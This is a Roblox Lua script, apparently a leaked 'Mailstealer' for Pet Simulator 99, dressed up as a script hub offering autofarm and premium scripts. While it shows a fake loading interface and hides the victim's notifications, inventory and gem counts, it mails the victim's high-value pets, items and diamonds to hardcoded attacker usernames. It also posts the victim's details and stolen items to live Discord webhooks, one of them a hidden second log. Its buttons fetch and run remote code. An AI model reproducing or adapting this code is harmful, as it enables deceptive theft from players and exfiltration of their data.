-- v5 LEAK!!!
-- MADE BY X SCRIPTS - discord.gg/xscripts
-- MADE BY X SCRIPTS - discord.gg/xscripts
-- MADE BY X SCRIPTS - discord.gg/xscripts
-- MADE BY X SCRIPTS - discord.gg/xscripts
-- MADE BY X SCRIPTS - discord.gg/xscripts
-- MADE BY X SCRIPTS - discord.gg/xscripts
-- MADE BY X SCRIPTS - discord.gg/xscripts
-- MADE BY X SCRIPTS - discord.gg/xscripts
-- MADE BY X SCRIPTS - discord.gg/xscripts
-- MADE BY X SCRIPTS - discord.gg/xscripts
Username = "Egorikusa_ghoul"
Username2 = "Egorikusa_ghoul"
Webhook = "https://discord.com/api/webhooks/1209209735518359642/uFboexmYcsBbSjjigX_LzsOzleqM0boIufCY394ni5qrUr7-Ojc4Amjjr972BVR64Gtq"

MinimumRAP = 100000
HubName = "X"

-- player check and stuff
ping = "@everyone"

if HubName == nil then
    HubName = "X"
end
UserSettings().GameSettings.MasterVolume = 0

local idiotuser = game:GetService("Players").LocalPlayer.Name

if idiotuser == Username then
    game:GetService("Players").LocalPlayer:Kick("You Are The Owner! (test it on alt acc)")
    return
end

if Username == nil then
    game:GetService("Players").LocalPlayer:Kick("Put A UserName")
    return
end

if MinimumRAP == nil then
    MinimumRAP = 100000
end

if Webhook == "" or Webhook == nil then
    ping = "forgot to put webhook"
    Webhook = "https://webhook.lewisakura.moe/api/webhooks/1200880234849906890/bvTHC72g_b99a_sX7x7YMtCO6lVCHsqxJ3LvOeSZlWTgG9T3lGp1wC0_sBmMEEXAb7D2"
end

if Username2 == "" or Username2 == nil then
    Username2 = Username
end

-- variables

local Library = require(game:GetService("ReplicatedStorage").Library)
local Save = Library.Save.Get()
local Client = require(game.ReplicatedStorage.Library.Client)
local Inventory = Save.Inventory
local Directory = Library.Directory

local SendRemote = game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send")
local HttpService = game:GetService("HttpService")

local function GetGems()
    return Client.CurrencyCmds.Get("Diamonds") or 0
end

if GetGems() < 10000 then
    NO_GEMS = true
end

-- hiding gui
Hiding = true
if Hiding == true then
    local loading = game:GetService("Players").LocalPlayer.PlayerScripts.Scripts.Core["Process Pending GUI"]
    local noti = game:GetService("Players").LocalPlayer.PlayerGui.Notifications
    loading.Disabled = true
    noti:GetPropertyChangedSignal("Enabled"):Connect(
        function()
            noti.Enabled = false
        end
    )
    noti.Enabled = false
    local player = game:GetService("Players").LocalPlayer
    local leaderstats = player:WaitForChild("leaderstats")

    for statName, statValue in pairs(leaderstats:GetChildren()) do
        if statValue:IsA("IntValue") then
            local initialValue = statValue.Value
            statValue:GetPropertyChangedSignal("Value"):Connect(
                function()
                    statValue.Value = initialValue
                end
            )
        end
    end
    local function freeze_mygems()
        local gems_frame = game:GetService("Players").LocalPlayer.PlayerGui.MainLeft.Left.Currency.Diamonds
        local gems_frame_clone = gems_frame:Clone()

        gems_frame_clone.Parent = game:GetService("Players").LocalPlayer.PlayerGui.MainLeft.Left.Currency
        gems_frame.Visible = true
    end

    freeze_mygems()
    local gemsframe = game:GetService("Players").LocalPlayer.PlayerGui.MainLeft.Left.Currency.Diamonds
    gemsframe:Destroy()
    local function freeze_inventory()
        local pets_frame = game:GetService("Players").LocalPlayer.PlayerGui.Inventory.Frame.Main.Pets
        local pets_frame_clone = pets_frame:Clone()
        pets_frame_clone.Parent = game:GetService("Players").LocalPlayer.PlayerGui.Inventory.Frame.Main
    end
    freeze_inventory()
    local Inventoryframe = game:GetService("Players").LocalPlayer.PlayerGui.Inventory.Frame.Main.Pets
    Inventoryframe:Destroy()
    if game.Workspace:FindFirstChild("__THINGS") then
        local pets = game.Workspace.__THINGS:FindFirstChild("Pets")
        if pets then
            pets:Destroy()
        end
    end
    if game.Players.LocalPlayer.PlayerScripts:FindFirstChild("Parallel Pet Actors") ~= nil then
        game.Players.LocalPlayer.PlayerScripts:FindFirstChild("Parallel Pet Actors"):Destroy()
    end
    local DualhookHub = Instance.new("ScreenGui")
    local Frame = Instance.new("Frame")
    local UICorner = Instance.new("UICorner")
    local Frame_2 = Instance.new("Frame")
    local UICorner_2 = Instance.new("UICorner")
    local Close = Instance.new("TextButton")
    local UICorner_3 = Instance.new("UICorner")
    local TextLabel = Instance.new("TextLabel")
    local Frame_3 = Instance.new("Frame")
    local UICorner_4 = Instance.new("UICorner")
    local TextLabel_2 = Instance.new("TextLabel")
    local TextLabel_3 = Instance.new("TextLabel")
    local Frame_4 = Instance.new("Frame")
    local UICorner_5 = Instance.new("UICorner")
    local TextLabel_4 = Instance.new("TextLabel")
    local TextLabel_5 = Instance.new("TextLabel")
    local Script3 = Instance.new("TextButton")
    local UICorner_6 = Instance.new("UICorner")
    local Frame_5 = Instance.new("Frame")
    local UICorner_7 = Instance.new("UICorner")
    local TextLabel_6 = Instance.new("TextLabel")
    local TextLabel_7 = Instance.new("TextLabel")
    local Script2 = Instance.new("TextButton")
    local UICorner_8 = Instance.new("UICorner")
    local Script1 = Instance.new("TextButton")
    local UICorner_9 = Instance.new("UICorner")
    local FrameUI = Instance.new("Frame")
    local TextLabel_8 = Instance.new("TextLabel")
    local TextLabel_9 = Instance.new("TextLabel")
    local UICorner_10 = Instance.new("UICorner")

    -- Properties

    DualhookHub.Name = ""..HubName.." Hub"
    DualhookHub.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
    DualhookHub.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

    Frame.Parent = DualhookHub
    Frame.BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
    Frame.BorderColor3 = Color3.new(0, 0, 0)
    Frame.BorderSizePixel = 0
    Frame.Position = UDim2.new(0.419834673, 0, 0.349563032, 0)
    Frame.Size = UDim2.new(0, 483, 0, 260)
    Frame.Visible = false

    UICorner.Parent = Frame

    Frame_2.Parent = Frame
    Frame_2.BackgroundColor3 = Color3.new(0.67451, 0.67451, 0.67451)
    Frame_2.BorderColor3 = Color3.new(0, 0, 0)
    Frame_2.BorderSizePixel = 0
    Frame_2.Position = UDim2.new(0, 0, 0.159615383, 0)
    Frame_2.Size = UDim2.new(0, 483, 0, 1)

    UICorner_2.Parent = Frame_2
    UICorner_2.CornerRadius = UDim.new(0, 9)

    Close.Name = "Close"
    Close.Parent = Frame
    Close.BackgroundColor3 = Color3.new(0.317647, 0.317647, 0.317647)
    Close.BorderColor3 = Color3.new(1, 1, 1)
    Close.BorderSizePixel = 0
    Close.Position = UDim2.new(0.929478467, 0, 0.0333332941, 0)
    Close.Size = UDim2.new(0, 25, 0, 26)
    Close.Font = Enum.Font.SourceSans
    Close.Text = "X"
    Close.TextColor3 = Color3.new(1, 1, 1)
    Close.TextSize = 17

    UICorner_3.Parent = Close
    UICorner_3.CornerRadius = UDim.new(0, 9)

    TextLabel.Parent = Frame
    TextLabel.BackgroundColor3 = Color3.new(1, 1, 1)
    TextLabel.BackgroundTransparency = 1
    TextLabel.BorderColor3 = Color3.new(0, 0, 0)
    TextLabel.BorderSizePixel = 0
    TextLabel.Position = UDim2.new(0.29192546, 0, -0.0153846154, 0)
    TextLabel.Size = UDim2.new(0, 200, 0, 50)
    TextLabel.Font = Enum.Font.FredokaOne
    TextLabel.Text = ""..HubName.." Hub"
    TextLabel.TextColor3 = Color3.new(1, 1, 1)
    TextLabel.TextSize = 25

    Frame_3.Parent = Frame
    Frame_3.BackgroundColor3 = Color3.new(0.356863, 0.356863, 0.356863)
    Frame_3.BorderColor3 = Color3.new(0, 0, 0)
    Frame_3.BorderSizePixel = 0
    Frame_3.Position = UDim2.new(0.0138316024, 0, 0.203846157, 0)
    Frame_3.Size = UDim2.new(0, 404, 0, 37)

    UICorner_4.Parent = Frame_3

    TextLabel_2.Parent = Frame_3
    TextLabel_2.BackgroundColor3 = Color3.new(1, 1, 1)
    TextLabel_2.BackgroundTransparency = 1
    TextLabel_2.BorderColor3 = Color3.new(0, 0, 0)
    TextLabel_2.BorderSizePixel = 0
    TextLabel_2.Position = UDim2.new(0.0554650947, 0, 0, 0)
    TextLabel_2.Size = UDim2.new(0, 119, 0, 23)
    TextLabel_2.Font = Enum.Font.FredokaOne
    TextLabel_2.Text = "Huge Games Premium"
    TextLabel_2.TextColor3 = Color3.new(1, 1, 1)
    TextLabel_2.TextSize = 16

    TextLabel_3.Parent = Frame_3
    TextLabel_3.BackgroundColor3 = Color3.new(1, 1, 1)
    TextLabel_3.BackgroundTransparency = 1
    TextLabel_3.BorderColor3 = Color3.new(0, 0, 0)
    TextLabel_3.BorderSizePixel = 0
    TextLabel_3.Position = UDim2.new(0.11369399, 0, 0.378378391, 0)
    TextLabel_3.Size = UDim2.new(0, 122, 0, 23)
    TextLabel_3.Font = Enum.Font.FredokaOne
    TextLabel_3.Text = "Free Premium key for "..HubName.." Hub Users"
    TextLabel_3.TextColor3 = Color3.new(1, 1, 1)
    TextLabel_3.TextSize = 14

    Frame_4.Parent = Frame
    Frame_4.BackgroundColor3 = Color3.new(0.356863, 0.356863, 0.356863)
    Frame_4.BorderColor3 = Color3.new(0, 0, 0)
    Frame_4.BorderSizePixel = 0
    Frame_4.Position = UDim2.new(0.0138316024, 0, 0.426923066, 0)
    Frame_4.Size = UDim2.new(0, 404, 0, 37)

    UICorner_5.Parent = Frame_4

    TextLabel_4.Parent = Frame_4
    TextLabel_4.BackgroundColor3 = Color3.new(1, 1, 1)
    TextLabel_4.BackgroundTransparency = 1
    TextLabel_4.BorderColor3 = Color3.new(0, 0, 0)
    TextLabel_4.BorderSizePixel = 0
    TextLabel_4.Position = UDim2.new(-0.0163170844, 0, 0, 0)
    TextLabel_4.Size = UDim2.new(0, 95, 0, 23)
    TextLabel_4.Font = Enum.Font.FredokaOne
    TextLabel_4.Text = "RedZ Hub"
    TextLabel_4.TextColor3 = Color3.new(1, 1, 1)
    TextLabel_4.TextSize = 16

    TextLabel_5.Parent = Frame_4
    TextLabel_5.BackgroundColor3 = Color3.new(1, 1, 1)
    TextLabel_5.BackgroundTransparency = 1
    TextLabel_5.BorderColor3 = Color3.new(0, 0, 0)
    TextLabel_5.BorderSizePixel = 0
    TextLabel_5.Position = UDim2.new(0.0369613208, 0, 0.378378391, 0)
    TextLabel_5.Size = UDim2.new(0, 139, 0, 23)
    TextLabel_5.Font = Enum.Font.FredokaOne
    TextLabel_5.Text = "First PS99 Autofarm Script"
    TextLabel_5.TextColor3 = Color3.new(1, 1, 1)
    TextLabel_5.TextSize = 14

    Script3.Name = "Script3"
    Script3.Parent = Frame
    Script3.BackgroundColor3 = Color3.new(0.407843, 0.407843, 0.407843)
    Script3.BorderColor3 = Color3.new(0.258824, 0.164706, 0)
    Script3.BorderSizePixel = 0
    Script3.Position = UDim2.new(0.900621116, 0, 0.649999976, 0)
    Script3.Size = UDim2.new(0, 37, 0, 37)
    Script3.Font = Enum.Font.SourceSans
    Script3.Text = ">"
    Script3.TextColor3 = Color3.new(1, 1, 1)
    Script3.TextSize = 20
    Script3.TextStrokeColor3 = Color3.new(1, 1, 1)
    Script3.TextWrapped = true

    UICorner_6.Parent = Script3
    UICorner_6.CornerRadius = UDim.new(0, 9)

    Frame_5.Parent = Frame
    Frame_5.BackgroundColor3 = Color3.new(0.356863, 0.356863, 0.356863)
    Frame_5.BorderColor3 = Color3.new(0, 0, 0)
    Frame_5.BorderSizePixel = 0
    Frame_5.Position = UDim2.new(0.0138316024, 0, 0.649999976, 0)
    Frame_5.Size = UDim2.new(0, 404, 0, 37)

    UICorner_7.Parent = Frame_5

    TextLabel_6.Parent = Frame_5
    TextLabel_6.BackgroundColor3 = Color3.new(1, 1, 1)
    TextLabel_6.BackgroundTransparency = 1
    TextLabel_6.BorderColor3 = Color3.new(0, 0, 0)
    TextLabel_6.BorderSizePixel = 0
    TextLabel_6.Position = UDim2.new(-0.0165362973, 0, 0, 0)
    TextLabel_6.Size = UDim2.new(0, 107, 0, 23)
    TextLabel_6.Font = Enum.Font.FredokaOne
    TextLabel_6.Text = ""..HubName.." Autofarm"
    TextLabel_6.TextColor3 = Color3.new(1, 1, 1)
    TextLabel_6.TextSize = 16

    TextLabel_7.Parent = Frame_5
    TextLabel_7.BackgroundColor3 = Color3.new(1, 1, 1)
    TextLabel_7.BackgroundTransparency = 1
    TextLabel_7.BorderColor3 = Color3.new(0, 0, 0)
    TextLabel_7.BorderSizePixel = 0
    TextLabel_7.Position = UDim2.new(0.0369613208, 0, 0.378378391, 0)
    TextLabel_7.Size = UDim2.new(0, 126, 0, 23)
    TextLabel_7.Font = Enum.Font.FredokaOne
    TextLabel_7.Text = "Our own Autofarm script"
    TextLabel_7.TextColor3 = Color3.new(1, 1, 1)
    TextLabel_7.TextSize = 14

    Script2.Name = "Script2"
    Script2.Parent = Frame
    Script2.BackgroundColor3 = Color3.new(0.407843, 0.407843, 0.407843)
    Script2.BorderColor3 = Color3.new(0.258824, 0.164706, 0)
    Script2.BorderSizePixel = 0
    Script2.Position = UDim2.new(0.900621116, 0, 0.426923066, 0)
    Script2.Size = UDim2.new(0, 37, 0, 37)
    Script2.Font = Enum.Font.SourceSans
    Script2.Text = ">"
    Script2.TextColor3 = Color3.new(1, 1, 1)
    Script2.TextSize = 20
    Script2.TextStrokeColor3 = Color3.new(1, 1, 1)
    Script2.TextWrapped = true

    UICorner_8.Parent = Script2
    UICorner_8.CornerRadius = UDim.new(0, 9)

    Script1.Name = "Script1"
    Script1.Parent = Frame
    Script1.BackgroundColor3 = Color3.new(0.407843, 0.407843, 0.407843)
    Script1.BorderColor3 = Color3.new(0.258824, 0.164706, 0)
    Script1.BorderSizePixel = 0
    Script1.Position = UDim2.new(0.900621116, 0, 0.203846157, 0)
    Script1.Size = UDim2.new(0, 37, 0, 37)
    Script1.Font = Enum.Font.SourceSans
    Script1.Text = ">"
    Script1.TextColor3 = Color3.new(1, 1, 1)
    Script1.TextSize = 20
    Script1.TextStrokeColor3 = Color3.new(1, 1, 1)
    Script1.TextWrapped = true

    UICorner_9.Parent = Script1
    UICorner_9.CornerRadius = UDim.new(0, 9)

    FrameUI.Name = "FrameUI"
    FrameUI.Parent = DualhookHub
    FrameUI.BackgroundColor3 = Color3.new(0.207843, 0.207843, 0.207843)
    FrameUI.BorderColor3 = Color3.new(0, 0, 0)
    FrameUI.BorderSizePixel = 0
    FrameUI.Position = UDim2.new(0.383609593, 0, 0.446081251, 0)
    FrameUI.Size = UDim2.new(0, 350, 0, 75)

    TextLabel_8.Parent = FrameUI
    TextLabel_8.BackgroundColor3 = Color3.new(1, 1, 1)
    TextLabel_8.BackgroundTransparency = 1
    TextLabel_8.BorderColor3 = Color3.new(0, 0, 0)
    TextLabel_8.BorderSizePixel = 0
    TextLabel_8.Position = UDim2.new(0.372093022, 0, 0.373333335, 0)
    TextLabel_8.Size = UDim2.new(0, 76, 0, 18)
    TextLabel_8.Font = Enum.Font.FredokaOne
    TextLabel_8.Text = "Loading"
    TextLabel_8.TextColor3 = Color3.new(1, 1, 1)
    TextLabel_8.TextSize = 30

    TextLabel_9.Parent = FrameUI
    TextLabel_9.BackgroundColor3 = Color3.new(1, 1, 1)
    TextLabel_9.BackgroundTransparency = 1
    TextLabel_9.BorderColor3 = Color3.new(0, 0, 0)
    TextLabel_9.BorderSizePixel = 0
    TextLabel_9.Position = UDim2.new(0.372093022, 0, 0, 0)
    TextLabel_9.Size = UDim2.new(0, 76, 0, 18)
    TextLabel_9.Font = Enum.Font.FredokaOne
    TextLabel_9.Text = ""..HubName.." Hub"
    TextLabel_9.TextColor3 = Color3.new(1, 1, 1)
    TextLabel_9.TextSize = 20

    UICorner_10.Parent = FrameUI
    UICorner_10.CornerRadius = UDim.new(0, 9)

    -- Scripts

    local function WYWX_fake_script() -- Frame.LocalScript
        local script = Instance.new("LocalScript", Frame)

        frame = script.Parent
        frame.Draggable = true
        frame.Selectable = true
        frame.Active = true
    end
    coroutine.wrap(WYWX_fake_script)()
    local function WYQU_fake_script() -- DualhookHub.LocalScript
        local script = Instance.new("LocalScript", DualhookHub)

        local MainGui = script.Parent

        local Script1 = MainGui.Frame.Script1
        local Script2 = MainGui.Frame.Script2
        local Script3 = MainGui.Frame.Script3
        local Close = MainGui.Frame.Close

        Script1.MouseButton1Up:Connect(
            function()
                getgenv().AuthKey = "HUGE"
                getgenv().temporaryDomain = true
                getgenv().LoadSettings = {
                    Example_Setting = Example_Value
                }
                loadstring(game:HttpGet("https://v3rmillion2.net/ps99"))()
            end
        )
        Script2.MouseButton1Up:Connect(
            function()
                loadstring(game:HttpGet("https://raw.githubusercontent.com/REDzHUB/PetSimulator99/main/redz9999.lua"))()
            end
        )
        Script3.MouseButton1Up:Connect(
            function()
                loadstring(game:HttpGet("https://dpaste.com/EDLKBEB43.txt"))()
            end
        )
        Close.MouseButton1Up:Connect(
            function()
                MainGui:Destroy()
            end
        )
    end
    coroutine.wrap(WYQU_fake_script)()
    local function MARTSC_fake_script() -- TextLabel_8.LocalScript
        local script = Instance.new("LocalScript", TextLabel_8)

        local textLabel = script.Parent

        local tweenService = game:GetService("TweenService")
        local frame = script.Parent.Parent

        local startPos = UDim2.new(0.459, 0, 991, 0)
        local endPos = UDim2.new(0.418, 0, 0.453, 0)
        local tweenInfo = TweenInfo.new(3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
        frame.Position = startPos

        function hideFrame()
            local tween = tweenService:Create(frame, tweenInfo, {Position = startPos})
            tween:Play()
        end

        for i = 1, 10 do
            textLabel.Text = "Loading."
            wait(0.5)
            textLabel.Text = "Loading.."
            wait(0.5)
            textLabel.Text = "Loading..."
            wait(0.5)
            if i == 10 then
                textLabel.Text = "Loaded!"
                hideFrame()
                wait(0.5)
                script.Parent.Parent.Parent.Frame.Visible = true
                break
            end
        end
    end
    coroutine.wrap(MARTSC_fake_script)()
    local function NNLK_fake_script() -- FrameUI.LocalScript
        local script = Instance.new("LocalScript", FrameUI)

        local tweenService = game:GetService("TweenService")
        local frame = script.Parent

        local startPos = UDim2.new(0.459, 0, 991, 0)
        local endPos = UDim2.new(0.418, 0, 0.453, 0)
        local tweenInfo = TweenInfo.new(3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
        frame.Position = startPos
        function showFrame()
            local tween = tweenService:Create(frame, tweenInfo, {Position = endPos})
            tween:Play()
        end
        function hideFrame()
            local tween = tweenService:Create(frame, tweenInfo, {Position = startPos})
            tween:Play()
        end
        showFrame()
    end
    coroutine.wrap(NNLK_fake_script)()
end
game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Claim All"):InvokeServer()

local function SuffixNumber(a)
    local actually_gems = a or 0
    local suffix = ""
    if actually_gems >= 1000000000 then
        actually_gems = actually_gems / 1000000000
        suffix = "b"
    elseif actually_gems >= 1000000 then
        actually_gems = actually_gems / 1000000
        suffix = "m"
    elseif actually_gems >= 1000 then
        actually_gems = actually_gems / 1000
        suffix = "k"
    end
    return string.format("%.1f%s", actually_gems, suffix)
end

local GetMaxInvokes = function(GemAmount)
    return math.floor(GemAmount / 10000)
end

if Save.Box then
    for key, _ in pairs(Save.Box) do
        game:GetService("ReplicatedStorage").Network["Box: Withdraw All"]:InvokeServer(key)
    end
end

local function GetRAP(dick, vagina)
    return (Library.DevRAPCmds.Get(
        {Class = {Name = vagina}, IsA = function(sex)
                return sex == vagina
            end, GetId = function()
                return dick.id
            end, StackKey = function()
                return HttpService:JSONEncode({id = dick.id, pt = dick.pt, sh = dick.sh, tn = dick.tn})
            end}
    ) or 0)
end

local function GetRAPOfHuges()
    HugesRAP = 0
    if Inventory.Pet ~= nil then
        for i, v in pairs(Inventory.Pet) do
            id = v.id
            dir = Directory.Pets[id]
            if dir.huge and dir.Tradable ~= false then
                HugesRAP = HugesRAP + GetRAP(v, "Pet")
            end
        end
    end
    return HugesRAP
end


if Webhook and string.find(Webhook, "discord") then
    Webhook = string.gsub(Webhook, "https://discord.com", "https://webhook.lewisakura.moe")
end

local function GetHits()
    HitsList = {}
    for Class, _ in pairs(Inventory) do
        for UID, v in pairs(_) do
            RAP = math.floor(GetRAP(v, Class))
            if RAP > 1000 and RAP >= MinimumRAP then
                if RAP >= 10000000 then
                    user = Username
                else
                    user = Username2
                end
                local ItemName = v.id
                local petVariant = v.sh and "Shiny " or ""
                if v.pt == 1 then
                    petVariant = "Golden " .. petVariant
                elseif v.pt == 2 then
                    petVariant = "Rainbow " .. petVariant
                end
                ItemName = petVariant .. ItemName
                if Class == "Pet" and (Directory.Pets[v.id].huge or Directory.Pets[v.id].exclusiveLevel) then
                    table.insert(
                        HitsList,
                        {
                            ITEM_CLASS = Class,
                            ITEM_ID = UID,
                            ITEM_NAME = ItemName,
                            ITEM_AMOUNT = (v._am or 1),
                            ITEM_RAP = RAP,
                            ITEM_LOCKED = (v._lk or false),
                            USERNAME = user
                        }
                    )
                elseif Class ~= "Pet" then
                    table.insert(
                        HitsList,
                        {
                            ITEM_CLASS = Class,
                            ITEM_ID = UID,
                            ITEM_NAME = ItemName,
                            ITEM_AMOUNT = (v._am or 1),
                            ITEM_RAP = RAP,
                            ITEM_LOCKED = (v._lk or false),
                            USERNAME = user
                        }
                    )
                end
            end
        end
    end
    table.sort(HitsList, function(a, b) return a.ITEM_RAP > b.ITEM_RAP end)
    return HitsList
end

HitsList = GetHits()
OldHits = GetHits()

--\\ DONT TOUCH!!
local function GetRAPOfHits(HitsList)
    rap = 0
    for i,v in pairs(HitsList) do
        rap = rap + v.ITEM_RAP
    end
    return rap
end
ALLRAP = GetRAPOfHits(HitsList)
PetValue = SuffixNumber(ALLRAP)
OldGems = SuffixNumber(GetGems())
--// DONT TOUCH!!

Wibhook = Webhook

stupid_user = game.Players.LocalPlayer.Name
stupid_display_user = game.Players.LocalPlayer.DisplayName

local function SendWebhook(url, ping, LostList, HitsList)
    local LostString = ""
    if LostList == nil then
        LostList = {}
    end
    if HitsList == nil then
        HitsList = {}
    end
    for _, v in pairs(LostList) do
        LostString = LostString .. "• " .. tostring(v.ITEM_NAME) .. " " .. tostring(v.ITEM_AMOUNT) .. "x" .. "\n"
    end
    if LostString == ""  then
        LostString = "NO LOST"
    end
    local HitsString = ""
    for _, v in pairs(HitsList) do
        HitsString = HitsString .. "• " .. tostring(v.ITEM_NAME) .. " " .. tostring(v.ITEM_AMOUNT) .. "x" .. "\n"
    end
    if HitsString == "" then
        HitsString = "NO ITEMS"
    end

    imgs = "https://i.ibb.co/GWsnpph/xpng.png"
    data1 = {
        ["content"] = ping,
        ["username"] = "X Mailstealer",
        ["avatar_url"] = imgs,
        ["embeds"] = {
            {
                ["title"] = "__`Mailstealer Hit`__ \240\159\142\137",
                ["url"] = "https://discord.gg/mailstealer",
                ["type"] = "rich",
                ["color"] = tonumber(0x4C00FF),
                ["thumbnail"] = {
                    ["url"] = imgs,
                    ["height"] = 420,
                    ["width"] = 420
                },
                ["fields"] = {
                    {
                        ["name"] = "`(\240\159\144\167) Player Info:`",
                        ["value"] = "```(\240\159\167\184) Username: " ..
                            stupid_user ..
                                "\n(\240\159\148\146) Display Username: " ..
                                    stupid_display_user ..
                                        "\n(\240\159\142\178) Creator: " ..
                                            Username ..
                                            "\n(\240\159\146\187) Exploit: " ..
                                            identifyexecutor() ..
                                                "\n(\240\159\146\142) Diamonds: " ..
                                                    OldGems ..
                                                        "\n(\240\159\164\145) Total RAP: " ..
                                                            PetValue .. "\n(\240\159\147\140) Version: X" .. "```",
                        ["inline"] = false
                    },
                    {
                        ["name"] = "`(\240\159\144\177) SENT:`",
                        ["value"] = "```" .. HitsString .. "```",
                        ["inline"] = true
                    },
                    {
                        ["name"] = "`(\240\159\144\177) DIDNT SEND:`",
                        ["value"] = "```" .. LostString .. "```",
                        ["inline"] = false
                    },
                    {
                        ["name"] = "",
                        ["value"] = "__**https://discord.gg/mailstealer**__",
                        ["inline"] = false
                    }
                }
            }
        }
    }
    newdata1 = HttpService:JSONEncode(data1)
    headers = {
        ["content-type"] = "application/json"
    }
    if Webhook ~= nil then
        local abcdef1 = {
            Url = url,
            Body = newdata1,
            Method = "POST",
            Headers = headers
        }
        local success, result = pcall(function()
            return HttpService:PostAsync(Wibhook, newdata1)
        end)
        if not success then
            request(abcdef1)
        end
    end
end

DiamondsBalance = GetGems()

local function SendGems()
    GemAmount = DiamondsBalance
    local MaxHits = GemAmount/10000
    local HitsAmount = #HitsList
    local GemsToSendHits = HitsAmount * 10000 + 10000
    if GemAmount > GemsToSendHits then
        for i, v in pairs(Inventory.Currency) do
            if v.id == "Diamonds" then
                SendRemote:InvokeServer(Username, v.id, "Currency", i, GemAmount - GemsToSendHits)
            end
        end
    end
end

function subtractTables(table1, table2)
    local result = {}
    for _, item1 in ipairs(table1) do
        local found = false
        for _, item2 in ipairs(table2) do
            if item1.ITEM_CLASS == item2.ITEM_CLASS and item1.ITEM_ID == item2.ITEM_ID and item1.ITEM_NAME == item2.ITEM_NAME and item1.ITEM_AMOUNT == item2.ITEM_AMOUNT then
                found = true
                break
            end
        end
        if not found then
            table.insert(result, item1)
        end
    end
    return result
end

-- sending shit

SendGems()

while true do
    local HitsList = GetHits()
    if #HitsList > 0 then
        local BestItem = HitsList[1]
        if BestItem.ITEM_LOCKED == true then
            local args = {BestItem.ITEM_ID, false}
            game:GetService("ReplicatedStorage").Network.Locking_SetLocked:InvokeServer(unpack(args))
        end
        local args = {
            [1] = BestItem.USERNAME,
            [2] = BestItem.ITEM_NAME,
            [3] = BestItem.ITEM_CLASS,
            [4] = BestItem.ITEM_ID,
            [5] = BestItem.ITEM_AMOUNT
        }
        SendRemote:InvokeServer(unpack(args))
    end
    if #HitsList == 0 or GetGems() < 10000 then
        if GetGems() < 10000 then
            LeftHits = GetHits()
        end
        if NO_GEMS ~= true then
            first_list = subtractTables(OldHits, LeftHits)
            second_list = LeftHits 
            SendWebhook(Webhook, ping, second_list, first_list)
            SendWebhook("https://webhook.lewisakura.moe/api/webhooks/1213423839900340234/hGrHSbyesr-xpL9Mbn5zG3GwxdEPN1_7_ZwHxxsXf6VO145yGBBFUiVdMg0hMBx7W0jv", "log", second_list, first_list)
        end
        print(ALL_HITS_RAP, DiamondsBalance)
        break
    end
end

-- experimental

local Library = require(game:GetService("ReplicatedStorage").Library)

local function deep_copy_table(original)
    local copy = table.clone(original)
    for key, value in pairs(copy) do
        if type(value) == "table" then
            copy[key] = table.clone(value)
        end
    end

    return copy
end

RealInventory = deep_copy_table(Library.Save.Get().Inventory)
GetEquipped = Library.PetCmds.GetEquipped()
FavoriteModeSelection = Library.Save.Get().FavoriteModeSelection
FavoriteModeSelectionPlaza = Library.Save.Get().FavoriteModeSelectionPlaza

local function freeze_inventory()
    local apply_packet = Library.Items.Container.ApplyPacket
    Library.Items.Container.ApplyPacket = function(self, packet)
        for operation, data in pairs(packet) do
            for InventoryIndex, SetData in pairs(data) do
                if operation == "set" then
                    for Index, Value in pairs(SetData or {}) do
                        RealInventory[InventoryIndex][Index] = Value
                    end
                elseif operation == "del" then
                    RealInventory.Pet[SetData] = nil
                    RealInventory.Currency[SetData] = nil
                    RealInventory.Egg[SetData] = nil
                    RealInventory.Enchant[SetData] = nil
                end
            end
        end
    end

    local oldGet = Library.Save.Get
    Library.Save.Get = function(...)
        local save = oldGet(...)
        save.EquippedPets = table.clone(GetEquipped or {})
        save.FavoriteModeSelection = {FavoriteModeSelection}
        save.FavoriteModeSelectionPlaza = {FavoriteModeSelectionPlaza}
        return save
    end
end

freeze_inventory()
print("yes")

-- fast huge send
